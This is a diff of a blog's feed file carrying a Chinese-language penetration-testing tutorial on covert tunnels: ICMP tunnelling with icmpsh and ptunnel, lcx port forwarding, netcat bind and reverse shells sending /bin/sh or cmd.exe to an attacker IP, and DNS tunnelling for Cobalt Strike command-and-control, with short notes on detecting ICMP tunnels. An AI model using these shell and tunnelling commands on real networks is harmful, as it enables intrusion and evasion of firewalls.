-<p>在一些网络环境中,如果攻击者使用各类上层隧道(例如 HTTP隧道、DNS隧道、常规正&#x2F;反向端口转发等）进行的操作都失败了，常常会通过ping 命令访问远程计算机，尝试建立ICMP隧道,将 TCP&#x2F;UDP 数据封装到ICMP的 ping 数据包中，从而穿过防火墙(通常防火墙不会屏蔽ping 数据包)，实现不受限制的网络访问。</p>
-<p>常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、powershell icmp等。</p>
-<h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>kali linux安装icmpsh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/inquisb/icmpsh.git</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123633553.png" alt="image-20220402123633553"></p>
-<p>安装 Python的 impacket类库,以便对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python-impacket </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123728167.png" alt="image-20220402123728167"></p>
-<p>因为 icmpsh 工具要代替系统本身的 ping命令的应答程序，所以需要输入如下命令来关闭本地系统的ICMP应答(（如果要恢复系统应答，则设置为0)，否则 Shell 的运行会不稳定（表现为一直刷屏，无法进行交互输入)。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123749265.png" alt="image-20220402123749265"></p>
-<p>然后kali执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python icmpsh_m.py 本机ip 目标ip</span><br></pre></td></tr></table></figure>
-
-<p>win7直接执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icmpsh.exe -t 攻击机ip（kali）</span><br></pre></td></tr></table></figure>
-
-<p>kali即可接受icmp反弹回来的shell</p>
-<h3 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="*PingTunnel"></a>*PingTunnel</h3><p>PingTunnel也是一款常用的 ICMP隧道工具，可以跨平台使用。为了避免隧道被滥用，可以为隧道设置密码。</p>
-<p>pingtunnel是把tcp&#x2F;udp&#x2F;sock5流量伪装成 icmp流量进行转发的工具</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p表示连接icmp隧道另一端的机器IP(即目标服务器)</span><br><span class="line">-lp表示需要监听的本地 tcp端口</span><br><span class="line">-da指定需要转发的机器的IP(即目标内网某—机器的内网IP)</span><br><span class="line">-dp指定需要转发的机器的端口(即目标内网某一机器的内网端口)</span><br><span class="line">-x设置连接的密码</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402220039638.png" alt="image-20220402220039638"></p>
-<p>Webserver: .&#x2F;ptunnel -x xiaodi （建立一个隧道，提供密码，等待别人连接）</p>
-<p>Hacker xiaodi:.&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi #转发的3389请求数据给本地1080</p>
-<p>Hacker xiaodi: rdesktop 127.0.0.1 1080</p>
-<p><a href="https://github.com/f1vefour/ptunnel">老版本介绍</a>需自行编译</p>
-<p><a href="https://github.com/esrrhs/pingtunnel">新版本介绍</a>二次开发版本</p>
-<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><p>许多网络管理员会阻止ICMP通信进入站点。但是在出站方向,ICMP通信是被允许的，而且目前大多数的网络和边界设备不会过滤ICMP流量。使用ICMP隧道时会产生大量的ICMP数据包，我们可以通过Wireshark进行ICMP数据包分析，以检测恶意ICMP流量，具体方法如下。</p>
-<p>·检测同一来源的icmp数据包的数量.一个正常的ping命令每秒最多发送两个数据包，而使用icmp隧道的浏览器会在很短的时间内产生上千个icmp数据包.</p>
-<p>·注意那些Payload大于64bit的 ICMP数据包。</p>
-<p>·寻找响应数据包中的Payload与请求数据包中的 Payload不一致的ICMP数据包。</p>
-<p>·检查ICMP 数据包的协议标签。例如，icmptunnel 会在所有的 ICMP Payload前面添加“TUNL”标记来标识隧道——这就是特征。</p>
-<h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等。在渗透测试中,如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用IPTABLES打开指定端口。如果内网中存在一系列防御系统,TCP、UDP 流量会被大量拦截。</p>
-<h2 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="*lcx端口转发"></a>*lcx端口转发</h2><p>首先介绍最为经典的端口转发工具lcx。lcx是一个基于Socket套接字实现的端口转发工具，有Windows和 Linux两个版本。Windows版为 Icx.exe，Linux版为portmap。一个正常的Socket隧道必须具备两端:一端为服务端，监听一个端口，等待客户端的连接;另一端为客户端，通过传入服务端的IP地址和端口，才能主动与服务器连接。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将本地 3389 给攻击 IP 的 3131</span><br><span class="line">lcx -slave 攻击 IP 3131 127.0.0.1 3389</span><br><span class="line"># 监听 3131 转发至 3333</span><br><span class="line">lcx -listen 3131 3333</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="netcat"><a href="#netcat" class="headerlink" title="*netcat"></a>*netcat</h2><p>之所以叫作netcat，是因为它是网络上的cat。cat 的功能是读取一个文件的内容并输出到屏幕上，netcat 也是如此——从网络的一端读取数据，输出到网络的另一端（可以使用TCP和 UDP协议)。</p>
-<p>正向：攻击连接受害</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 受害</span><br><span class="line">nc -ldp 1234 -e /bin/sh</span><br><span class="line">nc -ldp 1234 -e c:\windows\system32\cmd.exe</span><br><span class="line"></span><br><span class="line"># 攻击主动连接</span><br><span class="line">nc 192.168.76.132 1234（受害者的ip地址）</span><br></pre></td></tr></table></figure>
-
-
-
-<p>反向：受害连接攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 攻击</span><br><span class="line">nc -lvp 1234</span><br><span class="line"></span><br><span class="line"># 受害主动连接</span><br><span class="line">nc 攻击主机 IP 1234 -e /bin/sh</span><br><span class="line">nc 攻击主机 IP 1234 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
-
-
-
-<p>多向连接反弹shell-配合转发</p>
-<p>god\Webserver: Lcx.exe -listen 22223333<br>god\Sqlserver: nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe</p>
-<p>kali或本机: nc -v 192.168.76.1433333</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹服务: nc -nv 192.168.76.143</span><br><span class="line">端口扫描: nc -v -z 192.168.76.143 1-100</span><br><span class="line">端口监听: nc -lvp xxxx</span><br><span class="line">文件传输: nc -lp 1111 &gt;1.txt|nc -vn xx.XX.X.x 1111 &lt;1.txt -q 1</span><br><span class="line">反弹Shell:见上</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h2><p>PowerCat可以说是nc 的 PowerShell 版本。PowerCat可以通过执行命令回到本地运行，也可以使用远程权限运行。</p>
-<h1 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h1><h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><p>在内网中,几乎所有的Linux&#x2F;UNIX服务器和网络设备都支持SSH协议。在一般情况下,SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。同时，SSH协议的传输过程是加密的,所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。攻击者使用SSH端口隧道突破防火墙的限制后,能够建立-一些之前无法建立的TCP连接。</p>
-<h2 id="HTTP-x2F-HTTPS"><a href="#HTTP-x2F-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h2><p>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpreter,tunna 等。</p>
-<h2 id="DNS协议-1"><a href="#DNS协议-1" class="headerlink" title="*DNS协议"></a>*DNS协议</h2><p>​    DNS协议是一种请求&#x2F;应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现,但基于传统Socket隧道已经濒临淘汰及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP&#x2F;HTTPS等难以被禁用的协议已成为攻击者控制隧道的主流渠道。<br>​    通过本章前面的内容，我们已经对隧道技术有了一定的了解。一方面，在网络世界中，DNS是一个必不可少的服务;另一方面，DNS 报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤 DNS流量，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。<br>​    用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器(Command and Control Server,命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端（被控制的计算机)。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。正常网络之间的通信,都是在两台机器之间建立TCP 连接后进行的。在进行数据通信时:如果目标是IP地址，可以直接发送报文;如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后,C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序，让其受到控制。</p>
-<p>​        内网中安装了各种软&#x2F;硬件防护设施来检查主机与外部网络的连接情况很多厂商会收集C&amp;C服务端的域名、IP地址、URL等数据，帮助防火墙进行阻断操作。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现C&amp;C通信的技术（特别是DNS隧道技术)出现了。<br>​        DNS隧道的工作原理很简单:在进行DNS查询时，如果查询的域名不在 DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠 DNS协议即可进行数据包的交换。从 DNS 协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。</p>
-<p>1.云主机Teamserver配置端口53 启用-udp</p>
-<p>2.买一个域名，修改解析记录如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; checkin</span><br><span class="line">[*]Tasked beacon to checkin</span><br><span class="line">beacon&gt; mode dns-txt</span><br><span class="line">beacon&gt; shell whoami</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>隐藏通信隧道</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>面试题整理</title>
     <url>/2022/04/03/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1387,6 +1267,126 @@
       </categories>
       <tags>
         <tag>杂识</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>隐藏通信隧道</title>
+    <url>/2022/02/17/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>一般的网络通信，两个机器先建立TCP连接，然后正常数据通信，知道ip地址后可直接发送报文，不知道可以用域名解析，但是在实际中，可通过边界设备、软硬waf、ids检查阻断连接。</p>
+<p>隧道就是绕过端口屏蔽的通信方式，waf两端数据包通过waf允许的数据包类型或端口进行封装，穿过防火墙，进行通信。当封装的数据包到达目的地，进行还原，并将其还原后的数据包发送到相应的服务器上。</p>
+<p>CS、MSF无法上线，数据传输不稳定无回显、出口数据被监控、网络通信存在问题。</p>
+<p>常用隧道：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络层：IPv6、ICMP、GRE</span><br><span class="line">传输层：TCP、UDP、常规端口</span><br><span class="line">应用层：SSH、HTTP、HTTPS、DNS</span><br></pre></td></tr></table></figure>
+
+<h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><p>执行ping</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402090732542.png" alt="image-20220402090732542"></p>
+<h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><p>netcat（nc）瑞士军刀，工具，通过使用TCP或者UDP协议的网络连接读写数据。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402091737750.png" alt="image-20220402091737750"></p>
+<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>curl是一个利用url规则在命令行下工作的综合文件传输工具，支持文件上传下载。curl不仅支持HTTP、HTTPS、FTP等多种协议，还支持POST、Cookie、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。Linux操作系统自带curl命令。在Windows操作系统中,需要下载并安装curl命令</p>
+<p>在使用curl时,需要执行“curl&lt; IP地址:端口号 &gt;”命令。如果远程主机开启了相应的端口，会输出相应的端口信息，如图3-3所示。如果远程主机没有开通相应的端口，则没有任何提示。按“Ctrl+C”键即可断开连接。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402092506527.png" alt="image-20220402092506527"></p>
+<h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>在进行 DNS连通性检测时，常用的命令为nslookup和 dig。<br>nslookup是 Windows操作系统自带的 DNS 探测命令，其用法如下所示。在没有指定 vps-ip时，nslookup 会从系统网络的TCP&#x2F;IP属性中读取 DNS服务器的地址。具体的使用方法是:打开Windows操作系统的命令行环境,输人“nslookup”命令,按“回车”键,然后输入“help”命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402092938431.png" alt="image-20220402092938431"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup www.baidu.com vps-ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402093948502.png" alt="image-20220402093948502"></p>
+<p>dig是 Linux默认自带的 DNS 探测命令，其用法如下所示。在没有指定vps-ip时,dig会到<br>&#x2F;etc&#x2F;resolv.conf文件中读取系统配置的 DNS服务器的地址。如果vps-ip为192.168.43.1，将解析百度网的IP地址，说明目前DNS协议是连通的,如图3-5所示。具体的使用方法，可在 Linux命令行环境中输入“dig -h”命令获取。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig @vps-ip www.baidu.com（解析结果）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402093550235.png" alt="image-20220402093550235"></p>
+<p>还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下。<br>    查看网络连接，判断是否存在与其他机器的8080（不绝对）等端口的连接（可以尝试运行”ping -n 1 -a ip”命令)。<br>②查看内网中是否有主机名类似于“proxy”的机器。</p>
+<p>③查看IE浏览器的直接代理。</p>
+<p>④根据pac文件的路径（可能是本地路径，也可能是远程路径)，将其下载下来并查看。</p>
+<p>⑤执行如下命令，利用curl工具进行确认。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl www.baidu. com//不通</span><br><span class="line">curl -x proxy-ip:port www.baidu . com//通</span><br></pre></td></tr></table></figure>
+
+<h1 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h1><p>在网络层中，两个常用的 隧道协议是IPv6和ICMP，下面进行介绍</p>
+<h2 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h2><h3 id="技术简介"><a href="#技术简介" class="headerlink" title="技术简介"></a>技术简介</h3><p>“IPv6”是“Internet Protocol Version 6”的缩写，也被称为下一代互联网协议。它是由IETF设计用来代替现行的IPv4协议的一种新的IP协议。IPv4协议已经使用了20多年，目前面临着地址匮乏等一系列问题，而IPv6则能从根本上解决这些问题。现在，由于IPv4资源几乎耗尽，IPv6开始进入过渡阶段。</p>
+<p>IPv6隧道技术是指通过IPv4隧道传送 IPv6 数据报文的技术。为了在IPv4海洋中传递IPv6信息，可以将IPv4作为隧道载体,将IPv6报文整体封装在IPv4数据报文中,使IPv6报文能够穿过IPv4海洋,到达另一个IPv6小岛。<br>打个比方，快递公司收取包裹之后，发现自己在目的地没有站点，无法投送，则将此包裹转交给能到达目的地的快递公司（例如中国邮政）来投递。也就是说，将快递公司已经封装好的包裹（类似于IPv6报文)，用中国邮政的包装箱再封装一次（类似于封装成IPv4报文)，以便这个包裹在中国邮政的系统（IPv4海洋）中被正常投递。</p>
+<p>攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。有一点需要指出:即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。<br>配置隧道和自动隧道的主要区别是:只有在执行隧道功能的节点的IPv6地址是 IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点分配IP地址时,如果采用的是自动隧道方法，就不需要进行配置。<br>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如采用DHCP、人工配置或其他 IPv4的配置机制。<br>支持IPv6的隧道工具有socat、6tunnel、nt6tunnel 等。</p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>针对IPv6隧道攻击，最好的防御方法是:了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信,提高主机和应用程序的安全性。</p>
+<h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP隧道简单、实用,是一个比较特殊的协议。在一般的通信协议里,如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为ping 命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个 ping命令都有相对应的回复与请求。</p>
+<p>在一些网络环境中,如果攻击者使用各类上层隧道(例如 HTTP隧道、DNS隧道、常规正&#x2F;反向端口转发等）进行的操作都失败了，常常会通过ping 命令访问远程计算机，尝试建立ICMP隧道,将 TCP&#x2F;UDP 数据封装到ICMP的 ping 数据包中，从而穿过防火墙(通常防火墙不会屏蔽ping 数据包)，实现不受限制的网络访问。</p>
+<p>常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、powershell icmp等。</p>
+<h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>kali linux安装icmpsh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/inquisb/icmpsh.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123633553.png" alt="image-20220402123633553"></p>
+<p>安装 Python的 impacket类库,以便对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python-impacket </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123728167.png" alt="image-20220402123728167"></p>
+<p>因为 icmpsh 工具要代替系统本身的 ping命令的应答程序，所以需要输入如下命令来关闭本地系统的ICMP应答(（如果要恢复系统应答，则设置为0)，否则 Shell 的运行会不稳定（表现为一直刷屏，无法进行交互输入)。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123749265.png" alt="image-20220402123749265"></p>
+<p>然后kali执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python icmpsh_m.py 本机ip 目标ip</span><br></pre></td></tr></table></figure>
+
+<p>win7直接执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icmpsh.exe -t 攻击机ip（kali）</span><br></pre></td></tr></table></figure>
+
+<p>kali即可接受icmp反弹回来的shell</p>
+<h3 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="*PingTunnel"></a>*PingTunnel</h3><p>PingTunnel也是一款常用的 ICMP隧道工具，可以跨平台使用。为了避免隧道被滥用，可以为隧道设置密码。</p>
+<p>pingtunnel是把tcp&#x2F;udp&#x2F;sock5流量伪装成 icmp流量进行转发的工具</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p表示连接icmp隧道另一端的机器IP(即目标服务器)</span><br><span class="line">-lp表示需要监听的本地 tcp端口</span><br><span class="line">-da指定需要转发的机器的IP(即目标内网某—机器的内网IP)</span><br><span class="line">-dp指定需要转发的机器的端口(即目标内网某一机器的内网端口)</span><br><span class="line">-x设置连接的密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402220039638.png" alt="image-20220402220039638"></p>
+<p>Webserver: .&#x2F;ptunnel -x xiaodi （建立一个隧道，提供密码，等待别人连接）</p>
+<p>Hacker xiaodi:.&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi #转发的3389请求数据给本地1080</p>
+<p>Hacker xiaodi: rdesktop 127.0.0.1 1080</p>
+<p><a href="https://github.com/f1vefour/ptunnel">老版本介绍</a>需自行编译</p>
+<p><a href="https://github.com/esrrhs/pingtunnel">新版本介绍</a>二次开发版本</p>
+<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><p>许多网络管理员会阻止ICMP通信进入站点。但是在出站方向,ICMP通信是被允许的，而且目前大多数的网络和边界设备不会过滤ICMP流量。使用ICMP隧道时会产生大量的ICMP数据包，我们可以通过Wireshark进行ICMP数据包分析，以检测恶意ICMP流量，具体方法如下。</p>
+<p>·检测同一来源的icmp数据包的数量.一个正常的ping命令每秒最多发送两个数据包，而使用icmp隧道的浏览器会在很短的时间内产生上千个icmp数据包.</p>
+<p>·注意那些Payload大于64bit的 ICMP数据包。</p>
+<p>·寻找响应数据包中的Payload与请求数据包中的 Payload不一致的ICMP数据包。</p>
+<p>·检查ICMP 数据包的协议标签。例如，icmptunnel 会在所有的 ICMP Payload前面添加“TUNL”标记来标识隧道——这就是特征。</p>
+<h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等。在渗透测试中,如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用IPTABLES打开指定端口。如果内网中存在一系列防御系统,TCP、UDP 流量会被大量拦截。</p>
+<h2 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="*lcx端口转发"></a>*lcx端口转发</h2><p>首先介绍最为经典的端口转发工具lcx。lcx是一个基于Socket套接字实现的端口转发工具，有Windows和 Linux两个版本。Windows版为 Icx.exe，Linux版为portmap。一个正常的Socket隧道必须具备两端:一端为服务端，监听一个端口，等待客户端的连接;另一端为客户端，通过传入服务端的IP地址和端口，才能主动与服务器连接。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将本地 3389 给攻击 IP 的 3131</span><br><span class="line">lcx -slave 攻击 IP 3131 127.0.0.1 3389</span><br><span class="line"># 监听 3131 转发至 3333</span><br><span class="line">lcx -listen 3131 3333</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="netcat"><a href="#netcat" class="headerlink" title="*netcat"></a>*netcat</h2><p>之所以叫作netcat，是因为它是网络上的cat。cat 的功能是读取一个文件的内容并输出到屏幕上，netcat 也是如此——从网络的一端读取数据，输出到网络的另一端（可以使用TCP和 UDP协议)。</p>
+<p>正向：攻击连接受害</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 受害</span><br><span class="line">nc -ldp 1234 -e /bin/sh</span><br><span class="line">nc -ldp 1234 -e c:\windows\system32\cmd.exe</span><br><span class="line"></span><br><span class="line"># 攻击主动连接</span><br><span class="line">nc 192.168.76.132 1234（受害者的ip地址）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>反向：受害连接攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 攻击</span><br><span class="line">nc -lvp 1234</span><br><span class="line"></span><br><span class="line"># 受害主动连接</span><br><span class="line">nc 攻击主机 IP 1234 -e /bin/sh</span><br><span class="line">nc 攻击主机 IP 1234 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>多向连接反弹shell-配合转发</p>
+<p>god\Webserver: Lcx.exe -listen 22223333<br>god\Sqlserver: nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe</p>
+<p>kali或本机: nc -v 192.168.76.1433333</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹服务: nc -nv 192.168.76.143</span><br><span class="line">端口扫描: nc -v -z 192.168.76.143 1-100</span><br><span class="line">端口监听: nc -lvp xxxx</span><br><span class="line">文件传输: nc -lp 1111 &gt;1.txt|nc -vn xx.XX.X.x 1111 &lt;1.txt -q 1</span><br><span class="line">反弹Shell:见上</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h2><p>PowerCat可以说是nc 的 PowerShell 版本。PowerCat可以通过执行命令回到本地运行，也可以使用远程权限运行。</p>
+<h1 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h1><h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><p>在内网中,几乎所有的Linux&#x2F;UNIX服务器和网络设备都支持SSH协议。在一般情况下,SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。同时，SSH协议的传输过程是加密的,所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。攻击者使用SSH端口隧道突破防火墙的限制后,能够建立-一些之前无法建立的TCP连接。</p>
+<h2 id="HTTP-x2F-HTTPS"><a href="#HTTP-x2F-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h2><p>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpreter,tunna 等。</p>
+<h2 id="DNS协议-1"><a href="#DNS协议-1" class="headerlink" title="*DNS协议"></a>*DNS协议</h2><p>​    DNS协议是一种请求&#x2F;应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现,但基于传统Socket隧道已经濒临淘汰及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP&#x2F;HTTPS等难以被禁用的协议已成为攻击者控制隧道的主流渠道。<br>​    通过本章前面的内容，我们已经对隧道技术有了一定的了解。一方面，在网络世界中，DNS是一个必不可少的服务;另一方面，DNS 报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤 DNS流量，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。<br>​    用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器(Command and Control Server,命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端（被控制的计算机)。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。正常网络之间的通信,都是在两台机器之间建立TCP 连接后进行的。在进行数据通信时:如果目标是IP地址，可以直接发送报文;如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后,C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序，让其受到控制。</p>
